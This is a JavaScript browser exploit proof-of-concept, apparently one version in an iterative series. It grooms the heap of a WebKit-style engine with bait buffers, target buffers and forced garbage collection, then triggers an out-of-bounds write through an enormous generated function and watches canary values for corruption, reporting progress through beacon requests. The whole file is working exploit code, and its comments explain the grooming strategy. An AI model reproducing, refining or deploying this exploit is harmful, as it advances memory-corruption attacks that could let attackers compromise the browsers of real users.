// p144 — Bait-and-switch heap grooming
// PROBLEM: OOB sweep writes FORWARD (higher addresses) from metadata buffer.
// p143 targets sat at LOWER addresses → sweep missed them entirely.
//
// SOLUTION: Allocate BAITS → allocate TARGETS → free BAITS → GC →
// metadata fills a freed bait slot → sweep goes FORWARD into targets.
//
// libpas marge bitfit: sequential packing within 4MB pages.
// MADV_FREE keeps virtual mappings → sweep won't fault on freed regions.
// BUSE_RELEASE_LARGE_FREE=0 → freed pages stay in address space.
//
// Beacon prefix: V144B-

(function() {
  var B = function(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V144B-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  };

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var buffers = [];
    var views = [];
    var canaries = [];
    var running = false;
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V144B-W-' + tag + '?t=' + Date.now(), false);
        x.send();
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'targets') {
        var transferred = e.data.bufs;
        for (var i = 0; i < transferred.length; i++) {
          buffers.push(transferred[i]);
          views.push(new DataView(transferred[i]));
          canaries.push(e.data.canaries[i]);
        }
        beacon('GOT-' + buffers.length);
        self.postMessage({ ready: true });
      }
      else if (e.data.cmd === 'watch') {
        running = true;
        beacon('WATCHING');

        var found = false;
        var iterations = 0;
        var maxIter = 2000000;

        while (running && iterations < maxIter) {
          for (var i = 0; i < views.length; i++) {
            try {
              var v = views[i].getUint32(0, true);
              if (v !== canaries[i]) {
                var details = 'i=' + i + ',was=' + canaries[i].toString(16) +
                              ',now=' + v.toString(16);
                var bytes = '';
                for (var b = 0; b < 64 && b < views[i].byteLength; b += 4) {
                  bytes += views[i].getUint32(b, true).toString(16) + ',';
                }
                beacon('CORRUPT-' + details);
                beacon('BYTES-' + bytes.substring(0, 200));
                if (buffers[i].byteLength !== 100096) {
                  beacon('LEN-' + i + '-' + buffers[i].byteLength);
                }
                found = true;
                break;
              }
            } catch(ex) {
              beacon('ERR-' + i + '-' + (ex.message || '').substring(0, 30));
            }
          }
          if (found) break;
          iterations++;
          if (iterations % 100000 === 0) {
            beacon('POLL-' + iterations);
          }
        }

        if (!found) {
          beacon('NOCHANGE-' + iterations);
        }
        beacon('DONE');
      }
      else if (e.data.cmd === 'stop') {
        running = false;
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  // ── PHASE 1: BAIT BUFFERS ──
  // Same size as the wrapped metadata allocation (100,096 bytes).
  // These create the "hole" the metadata will fill.
  var TSIZE = 100096;
  var N_BAIT = 20;

  B('BAIT-START');
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    baits.push(new ArrayBuffer(TSIZE));
  }
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: TARGET BUFFERS ──
  // Allocated AFTER baits → higher addresses in the marge bitfit page.
  // The forward sweep will reach these.
  var N_TARGET = 60;
  var targets = [];
  var canaryList = [];

  B('TARGET-START');
  for (var t = 0; t < N_TARGET; t++) {
    var ab = new ArrayBuffer(TSIZE);
    var dv = new DataView(ab);
    var canary = (0xCA000000 | (t << 16) | (t ^ 0xBEEF)) >>> 0;
    dv.setUint32(0, canary, true);
    dv.setUint32(4, 0xFACE0000 | t, true);
    for (var f = 8; f < 128; f += 4) {
      dv.setUint32(f, (t << 16) | f, true);
    }
    targets.push(ab);
    canaryList.push(canary);
  }
  B('TARGET-DONE-' + N_TARGET);

  // ── PHASE 3: TRANSFER TO WORKER ──
  var transferList = [];
  var transferCanaries = [];
  var keepTargets = [];
  var keepCanaries = [];

  for (var t = 0; t < N_TARGET; t++) {
    if (t % 2 === 0) {
      transferList.push(targets[t]);
      transferCanaries.push(canaryList[t]);
    } else {
      keepTargets.push(targets[t]);
      keepCanaries.push(canaryList[t]);
    }
  }

  worker.onmessage = function(e) {
    if (e.data.ready) {
      phaseFreeBaits();
    }
  };

  B('TRANSFER-' + transferList.length);
  worker.postMessage(
    { cmd: 'targets', bufs: transferList, canaries: transferCanaries },
    transferList
  );

  // ── PHASE 4: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');

    // Use FinalizationRegistry to confirm GC collected baits
    var gcCount = 0;
    var registry = new FinalizationRegistry(function() { gcCount++; });
    registry.register(baits[0], 'sentinel');

    for (var i = 0; i < baits.length; i++) {
      baits[i] = null;
    }
    baits = null;

    // GC pressure: rapid alloc/discard cycles to trigger collection
    function gcPressure(round) {
      for (var j = 0; j < 500; j++) {
        new ArrayBuffer(8192);
      }
      for (var j = 0; j < 200; j++) {
        new Array(100).fill(round);
      }
    }

    var gcRound = 0;
    function tryGC() {
      gcPressure(gcRound);
      gcRound++;

      if (gcCount > 0) {
        B('GC-DONE-' + gcRound);
        phaseBuildOverflow();
      } else if (gcRound < 50) {
        setTimeout(tryGC, 20);
      } else {
        B('GC-TIMEOUT-' + gcRound);
        phaseBuildOverflow();
      }
    }

    tryGC();
  }

  // ── PHASE 5: BUILD OVERFLOW BLOB ──
  function phaseBuildOverflow() {
    B('BUILD-START');

    var N_OVERFLOW = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N_OVERFLOW / CHUNK);
    var REM = N_OVERFLOW - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v144fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v144ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v144ok ? 'OK' : 'FAIL'));
      if (!window.__v144fn) { B('NO-FN'); return; }

      // ── PHASE 6: WATCH + TRIGGER ──
      worker.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALLING');

        try {
          window.__v144fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }

        B('SURVIVED');

        var mc = 0;
        for (var k = 0; k < keepTargets.length; k++) {
          try {
            var dv = new DataView(keepTargets[k]);
            if (dv.getUint32(0, true) !== keepCanaries[k]) mc++;
          } catch(e) { mc++; }
        }
        B('MAIN-CORRUPT-' + mc);
        worker.postMessage({ cmd: 'stop' });
      }, 200);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
